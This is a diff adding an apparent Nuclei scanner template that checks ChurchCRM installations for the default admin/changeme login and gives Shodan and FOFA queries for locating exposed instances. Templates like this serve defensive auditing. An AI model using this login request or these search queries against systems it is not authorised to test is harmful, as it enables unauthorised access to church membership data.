@@ -1,0 +1,41 @@
+http:
+- attack: pitchfork
+  host-redirects: true
+  matchers:
+  - condition: and
+    dsl:
+    - contains_all(body, "ChurchCRM", "Dashboard", "Change Password")
+    - status_code == 200
+    type: dsl
+  payloads:
+    password:
+    - changeme
+    username:
+    - admin
+  raw:
+  - 'POST /session/begin HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    User={{username}}&Password={{password}}
+
+    '
+id: churchcrm-default-login
+info:
+  author: Kazgangap
+  description: 'ChurchCRM contains a default login vulnerability.
+
+    '
+  metadata:
+    fofa-query: app="churchcrm"
+    product: churchcrm
+    shodan-query: http.title:"churchcrm"
+    vendor: churchcrm
+  name: ChurchCRM - Default Login
+  reference:
+  - https://github.com/ChurchCRM/CRM
+  severity: high
+  tags: default-login,churchcrm,vuln
